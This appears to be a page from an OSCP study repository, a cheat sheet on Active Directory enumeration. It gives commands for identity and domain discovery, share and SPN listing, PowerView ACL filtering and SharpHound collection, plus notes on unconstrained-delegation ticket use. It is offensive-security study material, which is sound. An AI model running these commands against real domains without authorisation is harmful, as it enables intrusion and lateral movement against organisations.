Separate an unconstrained-delegation flag from tickets actually present - **Enter:** a computer/service account has `TrustedForDelegation`/unconstrained delegation and the selected host/session context is accessible. - **Discover:** confirm the account/SPNs and inspect the actual selected ticket cache with `klist` or `Rubeus.exe triage` in the permitted context. - **Validate:** ticket owner, realm, service/TGT type, validity, logon-session/LUID access, export/cache compatibility and the exact receiving service. A delegation flag without a cached client ticket is only configuration. - **Execute:** when a relevant ticket already exists, use the [ticket classification and cache procedure](../reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md) and [movement preflight](../reference/06-ad-lateral-movement/05-lateral-movement.md#2-preflight-from-the-actual-source). Forced/coerced authentication remains unavailable under the pending action procedure. - **Verify:** prove one named service action under the ticket principal, then preserve the host/LUID/cache scope. Do not record a password, hash or domain-wide privilege. - **Outcomes:** usable cached ticket accepted by the named service → [ticket and key context](../notes/methods/credentials.md#ticket-use)/[remote operation preflight](../notes/methods/lateral-movement.md#move-preflight); no relevant ticket in the inspectable context → current cached-ticket path ruled out; inaccessible LUID, stale ticket or ambiguous principal → inconclusive.
Documented commands and conditions Directly routed source: ```bash nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET -oN movement-preflight.txt getent hosts TARGET_HOST date -u ``` Windows source: ```powershell Resolve-DnsName TARGET_HOST Test-NetConnection TARGET_HOST -Port 445 Test-NetConnection TARGET_HOST -Port 5985 Test-NetConnection TARGET_HOST -Port 3389 w32tm /query /status ``` Port 135 alone does not prove WMI/DCOM viability because RPC commonly negotiates a dynamic high port. When the destination is reachable only through a pivot, perform these checks through the established Block 13 route and respect the client/proxy's transport limits. Record: ```text SOURCE POSITION -> TARGET FQDN/IP -> ROUTE -> SERVICE/PORT -> CREDENTIAL TYPE -> LOCAL/DOMAIN IDENTITY -> EXPECTED RIGHT -> CHOSEN METHOD -> EXPECTED EFFECT ```
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S19).

pages.markdown:
# AD Investigation — Where to Look and What Output Means

[Full AD cheatsheet — main working page](active-directory.md) | [Focused AD Notes](../notes/ad-investigation/README.md) | [Complete AD procedures](../reference/06-ad-lateral-movement/README.md)

This compatibility sheet retains its existing command and section links. Use the full AD cheatsheet for the combined command collection, starting-point chooser and concise interpretation; follow individual investigations for annotated output.

Use one check to answer one question. The expected result below is a cue, not proof of a complete attack. Replace placeholders in the selected access context; commands remain study references during concept study.

## What identity and domain am I actually using?

**Requires:** A Windows session, or domain credentials on Kali. A Windows username alone does not establish the identity used for network authentication.

**Run:** Windows. **Access:** Current token; domain/DC queries additionally need a usable domain/network context. **Effect:** Reads identity, discovery and time state.

```cmd
whoami /all
echo %USERDNSDOMAIN%
echo %USERDOMAIN%
echo %LOGONSERVER%
nltest /dsgetdc:DOMAIN
nltest /dclist:DOMAIN
w32tm /query /status
```

**Interpret:** whoami describes the process token. Domain environment variables are clues, not proof of successful authentication. nltest discovers a DC; SRV lookups test the naming layer. A plausible time source is useful, but does not itself prove the clock agrees with the KDC.

**Failure / next:** Discovery or time checks fail: repair that dependency before judging an account or technique.

**Stop when:** The local/network identity, domain/DC and relevant naming/time/route dependencies are recorded.. **Revisit only when:** Identity, DC, resolver, clock or source route changes..

[Annotated output and next decisions](../notes/ad-investigation/context.md) | [Full procedure](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#2-establish-identity-domain-dc-dns-and-time)

## Where do I find useful users and group memberships?

**Requires:** A working domain query context. Native Windows commands use the current network context; off-domain clients need explicit supported authentication.

**Run:** Windows. **Access:** Current domain query context; /domain selects directory rather than local accounts. **Effect:** Reads user, group and policy information.

```cmd
net user /domain
net user USER /domain
net group /domain
net group "Domain Admins" /domain
net group "GROUP" /domain
net accounts /domain
nltest /domain_trusts /all_trusts
net view /domain
net view \\DC_HOST
```

**Interpret:** The /domain switch selects domain objects rather than the local SAM. User detail connects an account to memberships; group detail identifies principals to investigate. RSAT adds structured queries only when its module exists.

**Failure / next:** Membership is partial or a query is denied: retain the gap; do not record the group as empty.

**Stop when:** Selected accounts, memberships and the next useful right are identified; unexplained names remain leads.. **Revisit only when:** A new identity or changed membership reveals different effective access..

[Annotated output and next decisions](../notes/ad-investigation/users.md) | [Full procedure](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#3-native-windows-baseline)

## Which shares and files should I inspect first?

**Requires:** A reachable SMB endpoint and an identified anonymous, local or domain authentication context. These contexts must be recorded separately.

**Run:** Windows. **Access:** Selected SMB server; current network identity and share/object permissions. **Effect:** Lists shares/directories; does not test file write or execution.

```cmd
net view \\DC_HOST
dir \\DC_HOST\SYSVOL
dir \\DC_HOST\NETLOGON
```

**Interpret:** net view and --shares inventory share-level candidates. smbclient then tests the named share with an explicit identity; ls, cd and get test progressively narrower objects. A successful file read can disclose information without granting execution.

**Failure / next:** Listing works but file reading is untested: keep the content claim inconclusive.

**Stop when:** The selected share/file access boundary and any useful clue are recorded.. **Revisit only when:** A new credential, permission or referenced file changes the access context..

[Annotated output and next decisions](../notes/ad-investigation/shares.md) | [Full procedure](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#7-shares-sysvol-and-netlogon)

## What does an SPN tell me to investigate?

**Requires:** A domain directory query context, with user/group enumeration available.

**Run:** Windows with setspn available. **Access:** Tool execution prerequisites and permitted domain directory queries; do not assume the binary is installed. **Effect:** Lists registrations; the shown -Q/-L forms do not add SPNs.

```cmd
setspn -Q */*
setspn -L ACCOUNT
```

**Interpret:** setspn inventories registrations; PowerView joins SPNs to account attributes. This is account/service mapping. Requesting offline guessing material and deciding whether cracking is worthwhile belong to the next page.

**Failure / next:** The service is unreachable: account enumeration still stands; remote service access remains unproved.

**Stop when:** The service registration is tied to its owning account and a concrete account-value question.. **Revisit only when:** A new account right, service route or justified password strategy changes the value..

[Annotated output and next decisions](../notes/ad-investigation/spns.md) | [Full procedure](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#8-service-accounts-and-spns)

## An ACL shows a powerful right — can I actually use it?

**Requires:** A selected directory object and a controlled identity whose direct/nested memberships are known.

**Run:** Windows PowerShell with reviewed PowerView. **Access:** Read access to the selected object security descriptor; controlled trustee membership must be checked separately. **Effect:** Reads candidate ACEs; does not change permissions.

```powershell
Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' } |
  Select-Object ObjectDN,SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceType,IsInherited,InheritanceType
```

**Interpret:** The filter selects interesting candidate ACEs, not a complete effective-access calculation. Resolve all applicable rules and the specific attribute/extended right before choosing a transition.

**Failure / next:** SID/GUID/inheritance is unresolved: do not perform a speculative modification.

**Stop when:** Trustee, applicable right, target type and missing effective-access checks are explicit.. **Revisit only when:** Membership, object ACL, scope or the controlled identity changes..

[Annotated output and next decisions](../notes/ad-investigation/acl.md) | [Full procedure](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#9-directory-acls-and-effective-control)

## How do I turn a BloodHound graph into a verified path?

**Requires:** A supported collector, compatible BloodHound deployment and a known collection identity. Mark only the identities and capabilities actually controlled.

**Run:** Windows with compatible SharpHound CE. **Access:** Domain DNS, authenticated directory context and compatible BloodHound ingestion. **Effect:** Collects directory relationships; DCOnly does not collect live workstation sessions.

```powershell
.\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip
```

**Interpret:** The first command collects directory data. The next commands add selected-host group/session evidence. Choose the source matching the deployment; legacy and current collectors are not interchangeable.

**Failure / next:** Host/session data was not collected: collect narrowly or validate manually.

**Stop when:** One candidate path has each required edge classified and its next manual check chosen.. **Revisit only when:** Collection scope, identity, host rights or session freshness changes..

[Annotated output and next decisions](../notes/ad-investigation/bloodhound.md) | [Full procedure](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#12-bloodhound-collect-narrowly-rank-then-validate)

## Choose a method and read its evidence

[Method comparison](../notes/ad-investigation/method-choice.md) | [Terminology](../notes/ad-investigation/glossary.md) | [Continuous worked investigation](../notes/ad-investigation/worked-chain.md) | [Unanswered interpretation cases](../notes/ad-investigation/practice-cases.md)

Compare raw lines with the annotated examples before accepting a normalized observation. A denial, empty query or incomplete collection can justify repairing a dependency or recording uncertainty rather than attempting an attack.

## Useful location does not equal a vulnerability

SYSVOL/NETLOGON -> scripts, policy and referenced files; application/deployment shares -> selected configurations; user/group objects -> effective memberships; target ACL -> exact trustee/right/GUID; SPNs -> service-account value; host/session evidence -> current reachable service rights and freshness.

[Secure-boundary comparison](../notes/ad-investigation/secure-baseline.md) | [Credential classification](../notes/ad-investigation/material.md) | [Failure diagnosis](../notes/ad-investigation/failure.md)
